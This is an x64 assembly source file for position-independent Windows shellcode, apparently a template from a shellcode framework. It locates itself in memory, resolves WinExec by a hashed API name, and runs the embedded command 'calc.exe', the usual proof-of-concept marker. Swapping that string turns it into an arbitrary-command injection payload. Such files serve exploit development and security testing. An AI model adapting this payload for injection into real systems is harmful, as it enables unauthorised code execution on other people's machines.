[ORG 0]
[BITS 64]

entry:
  ; store context
  push rbx                              ; store rbx
  cld                                   ; clear the direction flag

  ; calculate entry address
  call calc_entry_addr                  ; calculate the entry address
  flag_CEA:                             ; flag for calculate entry address

  ; call "kernel32.dll, WinExec"
  mov rcx, 0xCA2DBA870B222A04           ; set function hash
  mov rdx, 0xB725F01C80CE0985           ; set hash key
  mov r8, 2                             ; set num arguments
  lea r9, [rbx+command]                 ; lpCmdLine
  xor r10, r10                          ; clear r10
  mov r10b, [rbx+cmd_show]              ; uCmdShow
  sub rsp, 32+1*8                       ; reserve stack
  mov [rsp+32+0*8], r10                 ; uCmdShow
  call api_call                         ; call api function
  add rsp, 32+1*8                       ; restore stack

  ; restore context
  pop rbx                               ; restore rbx
  ret                                   ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop rax                               ; get return address
  lea rbx, [rax-flag_CEA]               ; calculate entry address.
  push rax                              ; push return address
  ret                                   ; return to entry

hash_api:
  %include "../../../src/x64/api_call.asm"

command:
  db "calc.exe", 0

cmd_show:
  db 1
